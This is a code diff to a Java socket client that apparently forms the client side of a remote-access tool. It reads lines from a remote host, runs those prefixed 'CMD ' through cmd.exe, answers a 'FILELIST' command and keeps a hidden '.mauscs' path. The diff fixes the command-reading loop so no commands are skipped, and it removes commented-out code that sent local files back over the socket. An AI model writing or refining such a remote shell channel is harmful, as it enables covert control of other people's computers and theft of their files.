@@ -47,7 +47,6 @@ public class Client {
         } catch (Exception ex) {
             ex.printStackTrace();
         }
-
         return jarFolder + "/.mauscs";
     }
 
@@ -57,8 +56,8 @@ public class Client {
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             out = new BufferedOutputStream(socket.getOutputStream());
             System.out.println("Client started: " + getHOST() + ":" + getPORT());
-            while (in.readLine() != null) {
-                String comm = in.readLine();
+            String comm;
+            while ((comm = in.readLine()) != null) {
                 if (comm.contains("CMD ")) {
                     exec(comm.replace("CMD ", ""));
                 } else if (comm.contains("FILELIST")) {
@@ -91,7 +90,7 @@ public class Client {
     }
 
     /* Execute a command using Java's Runtime. */
-    private void exec(String command) throws IOException, InterruptedException {
+    private void exec(String command) throws InterruptedException {
         if (!command.equals("")) {
             try {
                 ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", command);
@@ -192,29 +191,5 @@ public class Client {
         } catch (IOException e) {
             e.printStackTrace();
         }
-
-//        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
-//        DataOutputStream dos = new DataOutputStream(bos);
-//
-//        dos.writeInt(files.length);
-//
-//        for(File file : files){
-//            Long length = file.length();
-//            dos.writeLong(length);
-//
-//            String name = file.getName();
-//            dos.writeUTF(name);
-//
-//            FileInputStream fis = new FileInputStream(file);
-//            BufferedInputStream bis = new BufferedInputStream(fis);
-//
-//            int fbyte = 0;
-//            while((fbyte = bis.read()) != -1) {
-//                bos.write(fbyte);
-//
-//            }
-//            bis.close();
-//        }
-//        dos.close();
     }
 }
